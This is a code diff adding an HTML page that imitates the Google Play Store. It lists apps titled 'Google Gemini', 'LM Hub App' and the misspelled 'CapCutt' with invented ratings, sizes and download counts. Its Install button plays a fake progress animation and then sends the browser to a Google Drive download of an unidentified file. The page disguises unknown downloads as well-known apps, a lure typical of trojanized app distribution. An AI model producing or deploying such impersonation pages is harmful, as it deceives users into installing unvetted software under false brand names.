@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Google Play Store</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #111111;
+            --surface: #1f1f1f;
+            --text-main: #e8eaed;
+            --text-dim: #9aa0a6;
+            --google-blue: #8ab4f8;
+            --install-btn: #00a173;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            user-select: none;
+        }
+
+        /* List View Section */
+        #list-view { display: block; }
+        .header { padding: 15px 16px; display: flex; justify-content: space-between; align-items: center; }
+        .tabs { display: flex; gap: 20px; padding: 0 16px; border-bottom: 1px solid #3c4043; }
+        .tab { padding-bottom: 10px; color: var(--text-dim); font-size: 14px; font-weight: 500; }
+        .tab.active { color: var(--google-blue); border-bottom: 3px solid var(--google-blue); }
+
+        .app-item { display: flex; align-items: center; padding: 12px 16px; cursor: pointer; }
+        .rank { width: 30px; font-size: 14px; color: var(--text-dim); }
+        .icon { width: 56px; height: 56px; border-radius: 12px; margin-right: 15px; }
+        .info { flex: 1; }
+        .title { font-size: 14px; font-weight: 500; margin: 0; }
+        .meta { font-size: 12px; color: var(--text-dim); margin-top: 2px; }
+
+        /* Detail View Section */
+        #detail-view { display: none; padding: 16px; animation: fadeIn 0.3s ease; }
+        .back-nav { font-size: 24px; margin-bottom: 20px; cursor: pointer; }
+        
+        .detail-header { display: flex; align-items: center; gap: 20px; margin-bottom: 25px; }
+        
+        .progress-box { position: relative; width: 72px; height: 72px; }
+        .big-icon { width: 58px; height: 58px; border-radius: 12px; position: absolute; top: 7px; left: 7px; z-index: 2; }
+        canvas { position: absolute; top: 0; left: 0; transform: rotate(-90deg); z-index: 1; }
+
+        .detail-info h1 { font-size: 22px; margin: 0; font-weight: 400; }
+        .status-text { color: var(--text-dim); font-size: 13px; margin-top: 4px; }
+
+        .install-btn {
+            background-color: var(--install-btn);
+            color: #000; border: none; width: 100%; padding: 10px; border-radius: 20px;
+            font-weight: 500; font-size: 14px; margin: 20px 0; cursor: pointer;
+        }
+
+        .cancel-btn {
+            border: 1px solid #5f6368; background: transparent; color: var(--google-blue);
+            padding: 8px 20px; border-radius: 20px; font-size: 14px; display: none; margin-left: auto;
+        }
+
+        .stats { display: flex; justify-content: space-around; text-align: center; padding: 20px 0; border-bottom: 1px solid #3c4043; margin-bottom: 15px; }
+        .stat-box b { display: block; font-size: 14px; }
+        .stat-box span { font-size: 11px; color: var(--text-dim); }
+
+        .screenshots-container {
+            display: flex;
+            gap: 10px;
+            overflow-x: auto;
+            margin: 20px 0;
+            padding-bottom: 10px;
+        }
+        .screenshots-container::-webkit-scrollbar { display: none; }
+        .screenshot-img {
+            width: 150px;
+            border-radius: 8px;
+            flex-shrink: 0;
+        }
+
+        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
+    </style>
+</head>
+<body>
+
+    <div id="list-view">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" width="24">
+            <div style="background:#004d40; width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:12px;">L</div>
+        </div>
+        <div class="tabs">
+            <div class="tab">For you</div>
+            <div class="tab active">Top charts</div>
+            <div class="tab">Kids</div>
+        </div>
+        <div id="app-list-container"></div>
+    </div>
+
+    <div id="detail-view">
+        <div class="back-nav" onclick="closeDetails()">←</div>
+        
+        <div class="detail-header">
+            <div class="progress-box">
+                <img class="big-icon" id="d-icon" src="">
+                <canvas id="circleCanvas" width="72" height="72"></canvas>
+            </div>
+            <div class="detail-info">
+                <h1 id="d-title"></h1>
+                <div id="d-status" class="status-text">@Lakmina2005</div>
+            </div>
+            <button class="cancel-btn" id="cancel-btn" onclick="location.reload()">Cancel</button>
+        </div>
+
+        <div class="stats">
+            <div class="stat-box"><b id="d-rate"></b><span id="d-reviews"></span></div>
+            <div class="stat-box"><b id="d-downloads"></b><span>Downloads</span></div>
+            <div class="stat-box"><b id="d-size"></b><span>Size</span></div>
+        </div>
+
+        <button class="install-btn" id="install-btn" onclick="startDownload()">Install</button>
+
+        <div class="screenshots-container" id="screenshot-gallery"></div>
+
+        <div style="margin-top:20px; font-size:14px; color:var(--text-dim);">
+            About this game →
+        </div>
+    </div>
+
+    <script>
+        const apps = [
+            { 
+                id: 1, 
+                title: "Google Gemini", 
+                meta: "Adventure • 4.7 ★ • 986 KB", 
+                size: "986 KB", 
+                rate: "4.7 ★",
+                reviews: "28.8M reviews",
+                downloads: "1B+",
+                icon: "https://lh3.googleusercontent.com/d/1bCCVnywHuSVH2X7Ns2LIXRizdBQbUu-m", 
+                file: "1xTezOF3XAd_ax8vgnmfknbhFmEPwpjLM",
+                screenshots: [
+                    "https://lh3.googleusercontent.com/d/1N3JgexJhw799HjL9A_QRPrsTxjZ10CAS",
+                    "https://lh3.googleusercontent.com/d/18m9TLZEoF9xBwbsTq_h4sjUA-ZdC_jSU",
+                    "https://lh3.googleusercontent.com/d/1g1d_lxNZgB-lT1YPvA_nQBgiNhdpKIyh",
+                    "https://lh3.googleusercontent.com/d/1yz4VKBEdGMHx2LxzOzanYUb6AsdT06oE"
+                ]
+            },
+            { 
+                id: 2, 
+                title: "LM Hub App", 
+                meta: "Adventure • 1.2 ★ • 917 KB", 
+                size: "917 KB", 
+                rate: "1.2 ★",
+                reviews: "1.4 reviews",
+                downloads: "542",
+                icon: "https://lh3.googleusercontent.com/d/1_Kktl5Kq2hD3VQbyMpfAUBA6vkCC2lEo", 
+                file: "1Lgsm0hpK_f-eeHsj9xORtvFKaZ1MdRKa",
+                screenshots: [
+                    "https://lh3.googleusercontent.com/d/1Hhdindd5kkvI5pW3SPdXWLcdBvbbHbgP",
+                    "https://lh3.googleusercontent.com/d/1w3DyjRcn4IMGnDamn41NUxQOL7pxWOKj",
+                    "https://lh3.googleusercontent.com/d/1YjewKQaIHXeFr4flgDp_6V_6Z8B_fcis",
+                    "https://lh3.googleusercontent.com/d/1ubWDpORoLM2Ku5mRfUUejboY9107nojf",
+                    "https://lh3.googleusercontent.com/d/1Zeh20FDmGSWWtpHEfWuH_5M3u18HfyrA"
+                ]
+            },
+            { 
+                id: 3, 
+                title: "CapCutt: Photo & Video Editor", 
+                meta: "Adventure • 4.3 ★ • 917 KB", 
+                size: "917 KB", 
+                rate: "3.4 ★",
+                reviews: "12.5M reviews",
+                downloads: "542",
+                icon: "https://lh3.googleusercontent.com/d/15n-tNv8nPso4yQ9A1urTOeY0tiMYyk0a", 
+                file: "1PNxe8HtLpSe3W7Rs8ypngkth6v25SCq5",
+                screenshots: [
+                    "https://lh3.googleusercontent.com/d/1exEUOMNrbrLy87DdjhN2L1UJ5El6Qkas",
+                    "https://lh3.googleusercontent.com/d/1P4JYL8VYk2yHsTg2SIaTQoJv2zLzMZwv",
+                    "https://lh3.googleusercontent.com/d/1VBIWiYqseGbNjV52-YqmWq9Q4TDgX21-",
+                    "https://lh3.googleusercontent.com/d/1sYO6_ynQ_wUxpnTh4LWEqH-nuxdlhdMV",
+                    "https://lh3.googleusercontent.com/d/1gba4jFi94cSmMrwMvFjHBxkKRhnKGGpW",
+                    "https://lh3.googleusercontent.com/d/1Sa3gAHVxQbkJiob1wnMygvN0AutKrB5z",
+                    "https://lh3.googleusercontent.com/d/1bDbXjeDErIVFa-UUnsX6mEgUVJZKuY7g"
+                ]
+            }
+        
+        ];
+
+        let currentFileId = "";
+
+        function renderList() {
+            const container = document.getElementById('app-list-container');
+            container.innerHTML = "";
+            apps.forEach((app, index) => {
+                container.innerHTML += `
+                    <div class="app-item" onclick="openDetails(${index})">
+                        <div class="rank">${index + 1}</div>
+                        <img class="icon" src="${app.icon}">
+                        <div class="info">
+                            <p class="title">${app.title}</p>
+                            <p class="meta">${app.meta}</p>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function openDetails(index) {
+            const app = apps[index];
+            currentFileId = app.file;
+            document.getElementById('d-title').innerText = app.title;
+            document.getElementById('d-icon').src = app.icon;
+            document.getElementById('d-rate').innerText = app.rate;
+            document.getElementById('d-size').innerText = app.size;
+            document.getElementById('d-reviews').innerText = app.reviews;
+            document.getElementById('d-downloads').innerText = app.downloads;
+            
+            const gallery = document.getElementById('screenshot-gallery');
+            gallery.innerHTML = ""; 
+            app.screenshots.forEach(src => {
+                gallery.innerHTML += `<img src="${src}" class="screenshot-img">`;
+            });
+
+            document.getElementById('list-view').style.display = 'none';
+            document.getElementById('detail-view').style.display = 'block';
+            window.scrollTo(0,0);
+        }
+
+        function closeDetails() {
+            document.getElementById('list-view').style.display = 'block';
+            document.getElementById('detail-view').style.display = 'none';
+            location.reload(); 
+        }
+
+        function startDownload() {
+            document.getElementById('install-btn').style.display = 'none';
+            document.getElementById('cancel-btn').style.display = 'block';
+            
+            const canvas = document.getElementById('circleCanvas');
+            const ctx = canvas.getContext('2d');
+            const statusText = document.getElementById('d-status');
+            const appSize = document.getElementById('d-size').innerText;
+
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                ctx.clearRect(0, 0, 72, 72);
+                ctx.beginPath();
+                ctx.arc(36, 36, 33, 0, 2 * Math.PI);
+                ctx.strokeStyle = '#3c4043';
+                ctx.lineWidth = 3;
+                ctx.stroke();
+
+                ctx.beginPath();
+                ctx.arc(36, 36, 33, 0, (progress / 100) * 2 * Math.PI);
+                ctx.strokeStyle = '#8ab4f8';
+                ctx.lineWidth = 3;
+                ctx.stroke();
+
+                statusText.innerText = `${progress}% of ${appSize}`;
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    statusText.innerText = "Downloading...";
+                    window.location.href = `https://drive.usercontent.google.com/download?id=${currentFileId}&export=download&authuser=0`;
+                }
+            }, 60); 
+        }
+
+        renderList();
+    </script>
+</body>
+</html>
